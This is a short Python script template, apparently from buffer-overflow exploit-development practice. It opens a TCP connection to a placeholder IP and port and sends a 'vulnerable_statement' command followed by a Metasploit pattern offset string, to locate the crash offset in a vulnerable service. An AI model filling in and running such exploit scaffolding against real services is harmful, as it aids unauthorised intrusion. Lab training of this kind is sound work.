#!/usr/bin/python3
#change msf-code-offset as your  
#change ipaddress and port as your
#change vulnerable_statement

import sys, socket 
from time import sleep

offset = "msf-code-offset"

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ipaddress",port))
    
    payload = "vulnerable_statement /.:/" + offset 
    
    s.send((payload.encode()))
    s.close()
    
except:
    print ("Erorr connecting to server")
    sys.exit()
    